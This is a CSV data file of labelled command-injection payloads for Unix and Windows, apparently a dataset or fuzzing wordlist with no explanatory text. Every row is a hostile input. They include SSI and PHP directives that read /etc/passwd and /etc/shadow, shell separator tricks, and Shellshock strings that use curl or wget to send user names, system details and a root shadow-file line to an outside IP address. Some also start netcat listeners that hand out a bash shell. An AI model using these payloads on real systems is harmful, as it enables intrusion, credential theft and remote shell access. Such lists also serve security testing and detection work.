value,label,description
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;,Command Injection,Unix
&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;,Command Injection,Unix
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Unix
&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;,Command Injection,Unix
/index.html|id|,Command Injection,Unix
;id;,Command Injection,Unix
;id,Command Injection,Unix
;netstat -a;,Command Injection,Unix
;system('cat%20/etc/passwd'),Command Injection,Unix
;id;,Command Injection,Unix
|id,Command Injection,Unix
|/usr/bin/id,Command Injection,Unix
|id|,Command Injection,Unix
|/usr/bin/id|,Command Injection,Unix
||/usr/bin/id|,Command Injection,Unix
|id;,Command Injection,Unix
||/usr/bin/id;,Command Injection,Unix
;id|,Command Injection,Unix
;|/usr/bin/id|,Command Injection,Unix
\n/bin/ls -al\n,Command Injection,Unix
\n/usr/bin/id\n,Command Injection,Unix
\nid\n,Command Injection,Unix
\n/usr/bin/id;,Command Injection,Unix
\nid;,Command Injection,Unix
\n/usr/bin/id|,Command Injection,Unix
\nid|,Command Injection,Unix
;/usr/bin/id\n,Command Injection,Unix
;id\n,Command Injection,Unix
|usr/bin/id\n,Command Injection,Unix
|nid\n,Command Injection,Unix
`id`,Command Injection,Unix
`/usr/bin/id`,Command Injection,Unix
a);id,Command Injection,Unix
a;id,Command Injection,Unix
a);id;,Command Injection,Unix
a;id;,Command Injection,Unix
a);id|,Command Injection,Unix
a;id|,Command Injection,Unix
a)|id,Command Injection,Unix
a|id,Command Injection,Unix
a)|id;,Command Injection,Unix
a|id,Command Injection,Unix
|/bin/ls -al,Command Injection,Unix
a);/usr/bin/id,Command Injection,Unix
a;/usr/bin/id,Command Injection,Unix
a);/usr/bin/id;,Command Injection,Unix
a;/usr/bin/id;,Command Injection,Unix
a);/usr/bin/id|,Command Injection,Unix
a;/usr/bin/id|,Command Injection,Unix
a)|/usr/bin/id,Command Injection,Unix
a|/usr/bin/id,Command Injection,Unix
a)|/usr/bin/id;,Command Injection,Unix
a|/usr/bin/id,Command Injection,Unix
;system('cat%20/etc/passwd'),Command Injection,Unix
;system('id'),Command Injection,Unix
;system('/usr/bin/id'),Command Injection,Unix
%0Acat%20/etc/passwd,Command Injection,Unix
%0A/usr/bin/id,Command Injection,Unix
%0Aid,Command Injection,Unix
%0A/usr/bin/id%0A,Command Injection,Unix
%0Aid%0A,Command Injection,Unix
& ping -i 30 127.0.0.1 &,Command Injection,Unix
& ping -n 30 127.0.0.1 &,Command Injection,Unix
%0a ping -i 30 127.0.0.1 %0a,Command Injection,Unix
`ping 127.0.0.1`,Command Injection,Unix
| id,Command Injection,Unix
& id,Command Injection,Unix
; id,Command Injection,Unix
%0a id %0a,Command Injection,Unix
`id`,Command Injection,Unix
$;/usr/bin/id,Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""curl http://135.23.158.130/.testing/shellshock.txt?vuln=5""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 1 && echo vulnerable 1""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 3 && echo vulnerable 3""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9""",Command Injection,Unix
"() { :;}; /bin/bash -c ""sleep 6 && echo vulnerable 6""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`""",Command Injection,Unix
"() { :;}; /bin/bash -c ""wget http://135.23.158.130/.testing/shellshock.txt?vuln=4""",Command Injection,Unix
cat /etc/hosts,Command Injection,Unix
$(`cat /etc/passwd`),Command Injection,Unix
cat /etc/passwd,Command Injection,Unix
%0Acat%20/etc/passwd,Command Injection,Unix
"{{ get_user_file(""/etc/passwd"") }}",Command Injection,Unix
"<!--#exec cmd=""/bin/cat /etc/passwd""-->",Command Injection,Unix
"<!--#exec cmd=""/bin/cat /etc/shadow""-->",Command Injection,Unix
"<!--#exec cmd=""/usr/bin/id;-->",Command Injection,Unix
system('cat /etc/passwd');,Command Injection,Unix
"<?php system(""cat /etc/passwd"");?>",Command Injection,Unix
`,Command Injection,Windows
|| ,Command Injection,Windows
| ,Command Injection,Windows
; ,Command Injection,Windows
',Command Injection,Windows
"'""",Command Injection,Windows
"""",Command Injection,Windows
"""'",Command Injection,Windows
& ,Command Injection,Windows
&& ,Command Injection,Windows
%0a,Command Injection,Windows
%0a%0d,Command Injection,Windows
,Command Injection,Windows
%0Aid,Command Injection,Windows
%0a id %0a,Command Injection,Windows
%0Aid%0A,Command Injection,Windows
%0a ping -i 30 127.0.0.1 %0a,Command Injection,Windows
%0A/usr/bin/id,Command Injection,Windows
%0A/usr/bin/id%0A,Command Injection,Windows
"%2 -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",Command Injection,Windows
%20{${phpinfo()}},Command Injection,Windows
%20{${sleep(20)}},Command Injection,Windows
%20{${sleep(3)}},Command Injection,Windows
